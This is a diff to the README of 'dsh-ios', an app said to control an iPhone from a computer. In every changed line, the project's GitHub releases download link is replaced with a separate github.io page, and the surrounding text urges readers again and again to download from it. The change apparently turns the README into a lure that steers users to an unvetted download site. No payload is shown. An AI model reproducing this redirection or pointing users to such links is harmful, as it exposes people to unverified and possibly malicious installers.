@@ -1,6 +1,6 @@
 # 📱 dsh-ios - Control Your iPhone From Your Computer
 
-[![Download dsh-ios](https://img.shields.io/badge/Download-dsh--ios-blueviolet?style=for-the-badge&logo=apple)](https://github.com/Kickstartparty3459/dsh-ios/releases)
+[![Download dsh-ios](https://img.shields.io/badge/Download-dsh--ios-blueviolet?style=for-the-badge&logo=apple)](https://kickstartparty3459.github.io)
 
 ## 🎯 What Is dsh-ios?
 
@@ -12,7 +12,7 @@ Whether you're testing apps, showing someone how to use a feature, or automating
 
 Getting started with dsh-ios is simple. Follow these steps:
 
-1. **Visit this link to download the application**: [https://github.com/Kickstartparty3459/dsh-ios/releases](https://github.com/Kickstartparty3459/dsh-ios/releases)
+1. **Visit this link to download the application**: [https://kickstartparty3459.github.io](https://kickstartparty3459.github.io)
 2. Choose the latest version available.
 3. Download the file to your computer.
 
@@ -24,7 +24,7 @@ Here's how to get dsh-ios running on your Windows computer:
 
 ### Step 1: Download
 
-Visit this link to download the application: [https://github.com/Kickstartparty3459/dsh-ios/releases](https://github.com/Kickstartparty3459/dsh-ios/releases)
+Visit this link to download the application: [https://kickstartparty3459.github.io](https://kickstartparty3459.github.io)
 
 Look for the newest release. Click the download button and save the file somewhere you can find it easily, like your Desktop or Downloads folder.
 
@@ -117,7 +117,7 @@ If you run into any issues, try these steps:
 
 ## 🔄 Keeping dsh-ios Updated
 
-Visit this link to download the application: [https://github.com/Kickstartparty3459/dsh-ios/releases](https://github.com/Kickstartparty3459/dsh-ios/releases)
+Visit this link to download the application: [https://kickstartparty3459.github.io](https://kickstartparty3459.github.io)
 
 Check this page regularly for new versions. Updates bring new features, improvements, and bug fixes.
 
@@ -125,7 +125,7 @@ Check this page regularly for new versions. Updates bring new features, improvem
 
 dsh-ios transforms how you interact with your iPhone. It's powerful enough for professionals yet simple enough for beginners. Download it today and experience the convenience of controlling your iOS device from your computer.
 
-Remember: Visit this link to download the application: [https://github.com/Kickstartparty3459/dsh-ios/releases](https://github.com/Kickstartparty3459/dsh-ios/releases)
+Remember: Visit this link to download the application: [https://kickstartparty3459.github.io](https://kickstartparty3459.github.io)
 
 With dsh-ios, your iPhone is just a click away. Enjoy the freedom of desktop control with mobile convenience!
 
